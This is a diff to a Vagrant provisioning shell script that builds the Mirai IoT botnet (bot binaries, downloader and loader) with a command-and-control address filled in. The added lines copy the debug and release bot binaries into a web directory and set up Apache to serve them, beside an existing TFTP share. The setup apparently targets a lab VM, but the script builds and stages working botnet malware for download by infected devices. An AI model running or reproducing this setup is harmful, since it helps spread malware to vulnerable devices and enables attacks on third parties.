@@ -5,6 +5,7 @@ export DEBIAN_FRONTEND=noninteractive
 # if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 3 ]; then
 echo "apt-get update"
       apt-get update
+
 # fi
 apt-get install -y git gcc electric-fence mysql-server mysql-client duende
 mkdir -p /etc/maradns/logger/
@@ -79,6 +80,7 @@ echo ">>> Configuring dnsmasq..."
 echo "service systemd-resolved stop"
       service systemd-resolved stop
 mkdir -p /vagrant/tftp
+mkdir -p /vagrant/web/bins
 if ps | grep dnsmasq ; then
   killall dnsmasq || true
 fi
@@ -114,11 +116,13 @@ sed -i "s|{CNC}|$CNC|g;" /vagrant/mirai/dlr/main.c
 cd /vagrant/mirai/
 ./build.sh debug telnet
 cp /vagrant/mirai/debug/mirai* /vagrant/tftp/
+cp /vagrant/mirai/debug/mirai* /vagrant/web/bins/
 
 # build release
 cd /vagrant/mirai/
 ./build.sh release telnet
 cp /vagrant/mirai/release/mirai* /vagrant/tftp/
+cp /vagrant/mirai/release/mirai* /vagrant/web/bins/
 
 echo ">>> Building dlr..."
 cd /vagrant/mirai/dlr
@@ -135,5 +139,13 @@ cd /vagrant/mirai/loader
 ./build.sh release
 ./build.sh debug
 /vagrant/mirai/reports/build.sh 
+
+echo ">>> Building apache2..."
+echo "apt-get -y install apache2"
+      apt-get -y install apache2
+sed -i "s|/var/www/html|/vagrant/web/|g;" /etc/apache2/sites-enabled/000-default.conf
+sed -i "s|/var/www|/vagrant|g;" /etc/apache2/apache2.conf
+chmod 755 /vagrant/mirai/loader/bins/
+/etc/init.d/apache2 restart
 
 echo ">>> Done"
